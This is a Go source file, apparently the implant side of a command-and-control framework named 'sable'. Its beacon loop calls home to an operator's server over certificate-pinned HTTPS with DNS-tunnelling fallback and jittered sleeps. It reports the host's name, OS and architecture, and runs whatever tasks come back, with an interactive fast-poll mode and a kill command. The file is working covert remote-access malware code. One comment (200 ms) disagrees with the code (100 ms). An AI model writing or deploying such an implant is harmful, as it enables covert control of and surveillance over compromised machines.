package agent

import (
	"log"
	"math/rand"
	"os"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

// interactiveMode is set to 1 by the "interactive start" task so the beacon
// loop polls at 200 ms instead of the configured sleep interval.
var interactiveMode int32

var (
	beaconNonceFn     = protocol.RandomNonce
	sendBeaconHTTPSFn = sendBeaconHTTPS
	sendBeaconDNSFn   = sendBeaconDNS
)

// Run starts the beacon loop. It blocks until a kill task is received or the process exits.
func Run(cfg *Config) {
	client := newPinnedClient(cfg.CertFingerprint)
	var lastResult *protocol.TaskResult
	skipSleep := false

	for {
		// Skip the sleep when we have a fresh result to deliver, so the output
		// reaches the server on the very next beacon rather than after a full
		// sleep cycle. Normal idle beacons still sleep as configured.
		if !skipSleep {
			if atomic.LoadInt32(&interactiveMode) == 1 {
				time.Sleep(100 * time.Millisecond)
			} else {
				base := time.Duration(cfg.SleepSeconds) * time.Second
				jitter := time.Duration(rand.Int63n(int64(base / 5))) //nolint:gosec — jitter doesn't need crypto rand
				time.Sleep(base + jitter)
			}
		}
		skipSleep = false

		nonce, err := beaconNonceFn()
		if err != nil {
			continue
		}

		pendingResult := lastResult
		beacon := &protocol.Beacon{
			AgentID:    cfg.AgentID,
			Timestamp:  time.Now().Unix(),
			Nonce:      nonce,
			Hostname:   hostname(),
			OS:         runtime.GOOS,
			Arch:       runtime.GOARCH,
			TaskOutput: pendingResult,
		}

		encoded, err := protocol.EncodeBeacon(beacon, cfg.Secret)
		if err != nil {
			continue
		}

		respBytes, err := sendBeaconHTTPSFn(client, cfg.ServerURL, encoded)
		if err != nil {
			if cfg.DNSDomain != "" {
				respBytes, err = sendBeaconDNSFn(encoded, cfg.DNSDomain)
				if err != nil {
					log.Printf("beacon failed (https+dns): %v", err)
					continue
				}
			} else {
				log.Printf("beacon failed: %v", err)
				continue
			}
		}

		// Only clear the pending result after the server has acknowledged the beacon.
		// This preserves the audit trail across transient transport failures.
		lastResult = nil

		task, err := protocol.DecodeTask(respBytes, cfg.Secret)
		if err != nil || task.Type == "noop" {
			continue
		}

		if task.Type == "sleep" {
			if secs, err := strconv.Atoi(task.Payload); err == nil && secs > 0 {
				cfg.SleepSeconds = secs
			}
			continue
		}

		result := executeTask(task)
		lastResult = result

		if task.Type == "kill" {
			return
		}

		// Deliver the result on the next beacon without sleeping first.
		skipSleep = true
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}
